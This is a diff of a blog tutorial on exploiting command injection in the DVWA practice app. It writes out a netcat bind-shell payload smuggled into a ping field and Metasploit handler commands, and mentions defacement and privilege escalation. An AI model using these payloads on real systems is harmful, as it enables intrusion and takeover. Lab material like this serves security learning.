@@ -26,9 +26,7 @@ Sweet, DVWA simply appends our input in the underlying bash command!
 Now, let's listen on port 4444 and redirect all the incoming bytes to a bash shell:
 
 <pre><code data-trim class="bash">
-
 127.0.0.1; mkfifo /tmp/pipe ; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
-
 </code></pre>
 
 ![ci-3](/img/posts/ci/ci-3.png)
@@ -38,17 +36,18 @@ As you noticed the page is loading forever, so our backdoor is open and waiting 
 Let's start metasploit and open the shell on the server:
 
 <pre><code data-trim class="bash">
-
 ⁠⁠⁠msfconsole
 use exploit/multi/handler
 set payload linux/x64/shell
 set payload linux/x64/shell/bind_tcp
 set RHOST 127.0.0.1
-
 </code></pre>
 
 ![ci-4](/img/posts/ci/ci-4.png)
 
 Note that we didn't set the LPORT of bind_tcp, since the default one is 4444.
+
+As you notice we are the www-data user, and that's why we can't read the /etc/shadow file.
+But we have all the privileges that www-data user has, and that's enough for defacing DVWA, or exploiting a local privilege escalation vulnerability on the server in order to get root priviledges.
 
 Happy TCP binding!
